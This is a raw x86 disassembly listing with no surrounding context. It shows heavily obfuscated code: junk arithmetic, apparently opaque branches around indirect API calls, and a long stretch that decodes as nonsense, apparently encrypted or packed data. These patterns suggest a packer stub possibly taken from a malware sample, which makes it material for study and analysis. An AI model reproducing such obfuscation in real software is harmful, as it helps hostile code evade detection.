  41fb66:	sbb    DWORD PTR ds:0x42826b,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x42827f
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42822f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428237,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x42816f,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x428267,0x42826b
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x42837b,0x4282e3
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x42834f,0x0
  41fbc2:	mov    DWORD PTR ds:0x42817b,ebx
  41fbc8:	mov    DWORD PTR ds:0x428387,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x428257,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x428157,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x42834f,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x4280bf
  41fbfd:	call   DWORD PTR ds:0x428e20
  41fc03:	and    ecx,DWORD PTR ds:0x428243
  41fc09:	adc    DWORD PTR ds:0x4282d3,ecx
  41fc0f:	sub    DWORD PTR ds:0x4282db,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x42834b
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42820b
  41fc21:	mov    DWORD PTR ds:0x42834b,ecx
  41fc27:	and    DWORD PTR ds:0x4282f3,0x55d2
  41fc31:	add    DWORD PTR ds:0x42816f,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x42825f,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x42826f
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42813b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x428257,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42820f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x428273,ebx
  41fc7a:	mov    DWORD PTR ds:0x428287,0x2746
  41fc84:	mov    DWORD PTR ds:0x428257,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x42814b,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42820f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428e94
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x428383
  41fcc1:	and    DWORD PTR ds:0x42814b,0x4282ff
  41fccb:	mov    ecx,DWORD PTR ds:0x428153
  41fcd1:	xor    DWORD PTR ds:0x42821f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x428267
  41fcde:	sub    DWORD PTR ds:0x428373,ecx
  41fce4:	mov    DWORD PTR ds:0x428223,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x428387
  41fd0b:	add    eax,DWORD PTR ds:0x42814f
  41fd11:	mov    ds:0x428387,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x4282f3,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x4282db
  41fd39:	mov    ecx,DWORD PTR ds:0x42836b
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42820b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x4282f3,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e24
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x428253,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42822f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x428293
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x42827f,ecx
  41fd92:	sbb    DWORD PTR ds:0x428373,0x4282fb
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x4282ef,0x4282f3
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x42815f,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x42834f
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x42834f
  41fe15:	xor    DWORD PTR ds:0x428357,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x42814f,0x0
  41fe51:	not    DWORD PTR ds:0x42827b
  41fe57:	mov    DWORD PTR ds:0x428217,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x42814f,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e28
  41fe7d:	and    DWORD PTR ds:0x428367,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42821f
  41fe8d:	movzx  ecx,WORD PTR ds:0x4282f7
  41fe94:	and    DWORD PTR ds:0x4282d3,ecx
  41fe9a:	and    DWORD PTR ds:0x428247,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x42818b
  41feab:	mov    ecx,DWORD PTR ds:0x4283bf
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x42816f
  41fed3:	or     DWORD PTR ds:0x428383,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x42824b,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x42834f,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x4282cb,ecx
  41ff06:	cmp    DWORD PTR ds:0x42824b,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428133
  41ff18:	call   DWORD PTR ds:0x428e98
  41ff1e:	or     ecx,DWORD PTR ds:0x428153
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x4282f7,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42821b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0x92
  41ff55:	outs   dx,DWORD PTR ds:[esi]
  41ff56:	popa   
  41ff57:	jo     0x41ff7c
  41ff59:	and    edx,DWORD PTR [esi]
  41ff5b:	sbb    BYTE PTR [ebx-0x29e7e7ee],ah
  41ff61:	xchg   BYTE PTR [ebx],ch
  41ff63:	sbb    ch,BYTE PTR cs:[eax]
  41ff66:	xor    DWORD PTR [esi+eiz*8+0x5ecbfa73],0x7fbe73a2
  41ff71:	dec    ecx
  41ff72:	add    eax,0x9e9222b3
  41ff77:	pop    ecx
  41ff78:	sahf   
  41ff79:	(bad)
  41ff7c:	sub    DWORD PTR [edx+0x19],esi
  41ff7f:	fsub   st,st(3)
  41ff81:	cmp    ch,dl
  41ff83:	mov    ebx,0x47357a6d
  41ff88:	mov    ebx,0x1daeef65
  41ff8d:	inc    ebx
  41ff8e:	mov    cl,0x69
  41ff90:	js     0x41ff2b
  41ff92:	add    dl,BYTE PTR [edx]
  41ff94:	aam    0x64
  41ff96:	leave  
  41ff97:	retf   
  41ff98:	addr16 ss inc edx
  41ff9b:	or     al,0xbe
  41ff9d:	out    0x3,eax
  41ff9f:	jp     0x41ffcb
  41ffa1:	cmovo  edi,DWORD PTR [esp+eiz*2]
  41ffa5:	jg     0x41fff5
  41ffa7:	pusha  
  41ffa8:	mov    BYTE PTR [edx+eiz*2-0x5a],al
  41ffac:	add    al,0x11
  41ffae:	cmp    bl,BYTE PTR [edi+0x2d]
  41ffb1:	sbb    BYTE PTR [ecx],cl
  41ffb3:	test   DWORD PTR [ebx+eax*4],edi
  41ffb6:	mov    ds:0x4df05d07,al
  41ffbb:	(bad)  
  41ffbc:	pop    ecx
  41ffbd:	out    0x4f,al
  41ffbf:	cli    
  41ffc0:	jle    0x41ff67
  41ffc2:	and    eax,0xf1206ba0
  41ffc7:	sti    
  41ffc8:	jge    0x42001c
  41ffca:	mov    ebx,0xe4e660cb
  41ffcf:	push   ebx
  41ffd0:	sub    bl,BYTE PTR [ecx]
  41ffd2:	ds (bad) 
  41ffd4:	lods   al,BYTE PTR ds:[esi]
  41ffd5:	adc    ch,BYTE PTR [edi]
  41ffd7:	loope  0x41ff6d
  41ffd9:	dec    ebx
  41ffda:	xchg   al,cl
  41ffdc:	inc    ebx
  41ffdd:	or     eax,0xd6fa4c15
  41ffe2:	xchg   ebp,eax
  41ffe3:	jno    0x42000e
  41ffe5:	sub    ecx,0xfffffff8
  41ffe8:	inc    esp
  41ffe9:	loop   0x41ff8e
  41ffeb:	add    al,0x3b
  41ffed:	sbb    DWORD PTR [ecx],edx
  41ffef:	test   eax,0x27497f29
  41fff4:	lods   al,BYTE PTR ds:[esi]
  41fff5:	mov    ebp,0xb82da3ab
  41fffa:	mov    dh,0x95
  41fffc:	xlat   BYTE PTR ds:[ebx]
  41fffd:	in     eax,dx
  41fffe:	mov    cs,WORD PTR [edx]
  420000:	jge    0x420066
  420002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420003:	mov    edi,0x82d84ec4
  420008:	jb     0x41ffb1
  42000a:	xor    BYTE PTR [ebx-0x80],cl
  42000d:	add    BYTE PTR [ecx-0xd],dh
  420010:	xchg   edx,eax
  420011:	lock mov BYTE PTR [esi-0x1fb6505b],0x7a
  420019:	or     esp,DWORD PTR [esi+ebp*2]
  42001c:	shr    ah,1
  42001e:	mov    bl,0xe
  420020:	dec    ecx
  420021:	xor    dh,BYTE PTR [esi-0x19f945dd]
  420027:	push   es
  420028:	cmp    ah,ah
  42002a:	shl    DWORD PTR [edi+ecx*4],1
  42002d:	in     eax,0xc3
  42002f:	sti    
  420030:	div    DWORD PTR [edi]
  420032:	test   eax,0x5cf1b125
  420037:	pusha  
  420038:	jg     0x42006c
  42003a:	cli    
  42003b:	dec    ebp
  42003c:	pop    eax
  42003d:	in     al,dx
  42003e:	(bad)  
  42003f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420040:	nop
  420041:	cmp    BYTE PTR [eax+0x58],ch
  420044:	daa    
  420045:	mov    al,0x9e
  420047:	jmp    0x329050e2
  42004c:	jmp    0xdb5562a5
  420051:	jp     0x4200af
  420053:	enter  0x411e,0x2
  420057:	fimul  DWORD PTR [ecx]
  420059:	jae    0x420049
  42005b:	ret    
  42005c:	stos   DWORD PTR es:[edi],eax
  42005d:	fs in  eax,0xdd
  420060:	add    al,BYTE PTR [esi-0x4d]
  420063:	inc    edx
  420064:	lods   al,BYTE PTR ds:[esi]
  420065:	mov    ds:0x354ca38e,al
  42006a:	push   ds
  42006b:	jmp    0x223d:0x838e086
  420072:	popa   
  420073:	cs push ecx
  420075:	or     cl,BYTE PTR [ebx]
  420077:	(bad)  
  420078:	pop    ebx
  420079:	jae    0x42002c
  42007b:	xchg   ebx,eax
  42007c:	xor    al,0x3a
  42007e:	mov    es,edx
  420080:	js     0x420008
  420082:	data16 sbb BYTE PTR [eax],dh
  420085:	fisubr WORD PTR [ebx]
  420087:	repz lock loop 0x420038
  42008b:	test   BYTE PTR [esi-0x48],dl
  42008e:	adc    al,0x15
  420090:	arpl   WORD PTR [ebx+0x5bd2a48a],dx
  420096:	int3   
  420097:	sub    al,0x9
  420099:	push   edi
  42009a:	scas   al,BYTE PTR es:[edi]
  42009b:	sub    DWORD PTR [edx-0x2a],ebx
  42009e:	sbb    al,0xeb
  4200a0:	retf   0xe0f5
  4200a3:	stos   DWORD PTR es:[edi],eax
  4200a4:	sbb    BYTE PTR [edi-0x6e],al
  4200a7:	jge    0x420037
  4200a9:	out    0xed,eax
  4200ab:	mov    bh,0x3f
  4200ad:	and    bh,BYTE PTR [edx]
  4200af:	jo     0x420101
  4200b1:	xchg   edi,edx
  4200b3:	lahf   
  4200b4:	cmp    al,0xf3
  4200b6:	jno    0x42012f
  4200b8:	sahf   
  4200b9:	push   es
  4200ba:	mov    eax,0x36db2f23
  4200bf:	ret    0x68df
  4200c2:	mov    ds:0x10136620,eax
  4200c7:	and    DWORD PTR [ebx],ebx
  4200c9:	clc    
  4200ca:	gs mov edx,0x32d92d89
  4200d0:	adc    edi,esi
  4200d2:	pop    edi
  4200d3:	mov    bh,0x6e
  4200d5:	add    esp,ecx
  4200d7:	push   es
  4200d8:	or     ebx,DWORD PTR [ebx]
  4200da:	test   ecx,ebp
  4200dc:	call   0x9fbb0ce9
  4200e1:	fs test al,0xbb
  4200e4:	inc    edi
  4200e5:	jae    0x42007b
  4200e7:	inc    esp
  4200e8:	pusha  
  4200e9:	push   ebx
  4200ea:	(bad)  
  4200eb:	and    dh,BYTE PTR [ecx+0x79]
  4200ee:	push   ss
  4200ef:	test   BYTE PTR [eax-0xdb971c5],bh
  4200f5:	jno    0x4200fd
  4200f7:	sub    DWORD PTR [esi-0x78],edi
  4200fa:	leave  
  4200fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200fc:	scas   al,BYTE PTR es:[edi]
  4200fd:	test   dh,dl
  4200ff:	dec    edx
  420100:	and    al,0xe3
  420102:	xor    DWORD PTR [eax+ebp*2-0x11],ebp
  420106:	psubsb mm2,QWORD PTR [ecx]
  420109:	jb     0x420166
  42010b:	repnz add cl,bl
  42010e:	push   edx
  42010f:	mov    ecx,0x596f81d3
  420114:	imul   DWORD PTR [edi+0x5ac560ad]
  42011a:	ds push ebp
  42011c:	and    al,0x44
  42011e:	xchg   BYTE PTR [ecx+0x447c06e],ah
  420124:	jg     0x4200d8
  420126:	inc    ecx
  420127:	add    eax,0x2b8fda05
  42012c:	lods   al,BYTE PTR ds:[esi]
  42012d:	mul    DWORD PTR [ecx+0x35b41167]
  420133:	and    eax,0x9b33118b
  420138:	or     ebx,DWORD PTR [edi-0x1b46870e]
  42013e:	jmp    0x16d6:0x97135033
  420145:	out    dx,al
  420146:	cmp    al,BYTE PTR [ebx+0x49]
  420149:	popf   
  42014a:	or     eax,0xcaf39e0
  42014f:	mov    al,BYTE PTR [ebx+0x4dc480d0]
  420155:	addr16 ss pushf 
  420158:	(bad)  
  420159:	fst    QWORD PTR [edi-0x53]
  42015c:	imul   edx,DWORD PTR [esi],0x5a
  42015f:	cwde   
  420160:	lahf   
  420161:	(bad)  
  420163:	jno    0x420154
  420165:	jge    0x420153
  420167:	(bad)  
  420168:	in     al,0x54
  42016a:	xchg   DWORD PTR [ebx+eax*4+0x71],edx
  42016e:	ss mov al,0xf0
  420171:	ror    DWORD PTR ds:0x24ce3fc9,0x8e
  420178:	sbb    al,dh
  42017a:	daa    
  42017b:	jmp    0x1af5ad68
  420180:	xchg   ebp,eax
  420181:	stos   DWORD PTR es:[edi],eax
  420182:	add    BYTE PTR [esi-0x7d],ch
  420185:	sar    DWORD PTR [eax+eiz*2+0x2a],0xce
  42018a:	enter  0x103d,0x94
  42018e:	cmp    BYTE PTR [ecx],dh
  420190:	cmp    DWORD PTR [edi-0x3a7897b3],esi
  420196:	add    eax,0xadd875c6
  42019b:	bound  esi,QWORD PTR [esi+0x1e]
  42019e:	lods   eax,DWORD PTR es:[esi]
  4201a0:	adc    eax,0x777edf27
  4201a5:	jecxz  0x420157
  4201a7:	rcr    bh,0x86
  4201aa:	sbb    ebp,edi
  4201ac:	outs   dx,DWORD PTR ds:[esi]
  4201ad:	push   cs
  4201ae:	popa   
  4201af:	sbb    al,0xa1
  4201b1:	call   edi
  4201b3:	(bad)  
  4201b5:	mov    ss,WORD PTR [eax]
  4201b7:	fldcw  WORD PTR [eax]
  4201b9:	xor    DWORD PTR [ecx+0x49087c67],0x27a96fc1
  4201c3:	pop    edi
  4201c4:	cs inc ebp
  4201c6:	inc    eax
  4201c7:	sub    eax,0x2eff57ed
  4201cc:	jmp    0x6c59dada
  4201d1:	push   edx
  4201d2:	pop    edi
  4201d3:	cmp    ebx,ecx
  4201d5:	and    dh,dh
  4201d7:	mov    bh,0x9a
  4201d9:	jo     0x4201bf
  4201db:	fnstsw WORD PTR [edi+0x5b]
  4201de:	pop    ss
  4201df:	dec    edi
  4201e0:	cmp    al,0x54
  4201e2:	dec    BYTE PTR [ecx+edx*4]
  4201e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201e6:	out    dx,al
  4201e7:	xchg   ebx,eax
  4201e8:	pushf  
  4201e9:	mov    ch,0x60
  4201eb:	call   0x2756d959
  4201f0:	retf   0xa715
  4201f3:	jo     0x420264
  4201f5:	push   edi
  4201f6:	iret   
  4201f7:	and    BYTE PTR [ecx-0x49],dl
  4201fa:	push   ebp
  4201fb:	fld    TBYTE PTR [ebp-0x74bbd1f4]
  420201:	push   ebx
  420202:	mov    ah,0x83
  420204:	push   ecx
  420205:	retf   0x569d
  420208:	cmp    BYTE PTR [eax-0x15ba37ac],ch
  42020e:	es push ecx
  420210:	add    esi,esp
  420212:	or     edx,DWORD PTR [ebp+0x4c]
  420215:	shl    esp,1
  420217:	mov    eax,0xfa62a34a
  42021c:	inc    ebp
  42021d:	in     al,0xdf
  42021f:	sub    ebx,DWORD PTR [ecx]
  420221:	(bad)  
  420222:	adc    eax,0xfd70ecf
  420227:	lahf   
  420228:	xor    al,0xd5
  42022a:	cld    
  42022b:	or     eax,0x31cbeb5e
  420230:	cmp    ebx,DWORD PTR [edi-0x4f]
  420233:	push   ss
  420234:	add    DWORD PTR [edi-0x5a],0xffffffcd
  420238:	pop    edx
  420239:	jno    0x420248
  42023b:	jne    0x42020c
  42023d:	inc    ecx
  42023e:	xchg   DWORD PTR [edi+0x67f552b0],ebx
  420244:	push   es
  420245:	call   0x4edd:0xf404f8a6
  42024c:	pop    esp
  42024d:	pop    es
  42024e:	xchg   edx,eax
  42024f:	repz mov eax,0xfb8c3463
  420255:	stos   DWORD PTR es:[edi],eax
  420256:	pop    ecx
  420257:	mov    esp,ecx
  420259:	jnp    0x420290
  42025b:	mov    eax,ds:0x291b9c19
  420260:	inc    esp
  420261:	sbb    eax,0x3ec34b70
  420266:	scas   eax,DWORD PTR es:[edi]
  420267:	inc    eax
  420268:	cbw    
  42026a:	xor    DWORD PTR [edi+0xfdb0617],edi
  420270:	mov    bl,0x2a
  420272:	inc    edi
  420273:	in     al,0x60
  420275:	or     ecx,DWORD PTR ds:0xcc6f4489
  42027b:	ss or  bl,dl
  42027e:	test   eax,0xf0776160
  420283:	or     esp,DWORD PTR [edx]
  420285:	sbb    eax,edi
  420287:	ss sti 
  420289:	push   0xffffffbb
  42028b:	sub    BYTE PTR [edi+0x2419bf53],0x42
  420292:	jne    0x420283
  420294:	enter  0x69d7,0xb
  420298:	scas   al,BYTE PTR es:[edi]
  420299:	cwde   
  42029a:	sub    DWORD PTR [eax-0x742c78b4],ebp
  4202a0:	(bad)  
  4202a1:	in     al,dx
  4202a2:	(bad)  
  4202a3:	(bad)  
  4202a4:	inc    DWORD PTR [ecx+0x42826f0d]
  4202aa:	add    bl,ch
  4202ac:	add    BYTE PTR [edx+0x0],0x2b
  4202b0:	ror    DWORD PTR [ebx+0x4283670d],0x0
  4202b7:	add    DWORD PTR ds:0x4282ef,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x42836b,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x428147,0x428267
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x42835b,0x42813f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x428253,0x42820b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x4282eb,0x0
  42030c:	mov    DWORD PTR ds:0x428243,edx
  420312:	mov    esi,DWORD PTR ds:0x42820b
  420318:	mov    DWORD PTR ds:0x4282e7,ebx
  42031e:	mov    DWORD PTR ds:0x4282f7,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x428163,0x3019
  420337:	not    DWORD PTR ds:0x4282eb
  42033d:	cmp    DWORD PTR ds:0x4282eb,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x42834b
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428e9c
  420363:	adc    ecx,DWORD PTR ds:0x428223
  420369:	xor    DWORD PTR ds:0x4282df,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x4281fb
  420377:	mov    esi,DWORD PTR ds:0x4282b3
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x428167,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x4282db,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x428357,0x0
  4203b4:	mov    DWORD PTR ds:0x42827f,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x42817b
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42823f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42823b,edi
  4203db:	cmp    DWORD PTR ds:0x428357,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x427fcf
  4203ed:	call   DWORD PTR ds:0x428ea0
  4203f3:	movzx  esi,WORD PTR ds:0x428157
  4203fa:	add    DWORD PTR ds:0x4282d7,esi
  420400:	adc    DWORD PTR ds:0x428177,ebx
  420406:	add    DWORD PTR ds:0x428353,0x22a2
  420410:	and    esi,DWORD PTR ds:0x428353
  420416:	or     DWORD PTR ds:0x42834f,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x4282d3
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x428253,0x0
  42042e:	mov    DWORD PTR ds:0x428353,0x5615
  420438:	mov    DWORD PTR ds:0x42814b,0x419b
  420442:	mov    DWORD PTR ds:0x42816f,0x389d
  42044c:	not    DWORD PTR ds:0x428243
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x428253,0x0
  420463:	je     0x4204a0
  420469:	push   0x42821f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428ea4
  420477:	sub    DWORD PTR ds:0x4282d7,0x6950
  420481:	movzx  esi,WORD PTR ds:0x42824b
  420488:	xor    esi,DWORD PTR ds:0x4282fb
  42048e:	mov    DWORD PTR ds:0x42824b,esi
  420494:	mov    esi,DWORD PTR ds:0x428233
  42049a:	or     DWORD PTR ds:0x4282cf,esi
  4204a0:	xor    DWORD PTR ds:0x4282ff,ecx
  4204a6:	add    DWORD PTR ds:0x4282ff,ebx
  4204ac:	or     DWORD PTR ds:0x428357,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x42816b,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x42814f,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x428387,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x42816b,0x0
  420500:	mov    DWORD PTR ds:0x4282d3,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x42826f
  42051b:	cmp    DWORD PTR ds:0x42816b,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428ea8
  420543:	mov    esi,DWORD PTR ds:0x42815b
  420549:	sbb    DWORD PTR ds:0x428177,esi
  42054f:	and    DWORD PTR ds:0x428273,edx
  420555:	sbb    DWORD PTR ds:0x428227,edx
  42055b:	mov    esi,DWORD PTR ds:0x42835f
  420561:	or     DWORD PTR ds:0x428363,esi
  420567:	mov    esi,DWORD PTR ds:0x428187
  42056d:	mov    edx,DWORD PTR ds:0x42831f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x42835f,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x428153,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x428377,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428213,0x2222
  4205bd:	not    DWORD PTR ds:0x428223
  4205c3:	cmp    DWORD PTR ds:0x428153,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x42837f
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e2c
  4205e8:	xor    edx,DWORD PTR ds:0x428227
  4205ee:	mov    ecx,DWORD PTR ds:0x42820f
  4205f4:	or     DWORD PTR ds:0x42813f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x4282b3
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x42837b,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x42825b
  42061a:	xor    DWORD PTR ds:0x428247,edx
  420620:	movzx  ecx,WORD PTR ds:0x428233
  420627:	and    ecx,DWORD PTR ds:0x42836b
  42062d:	mov    DWORD PTR ds:0x428233,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x42837f,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
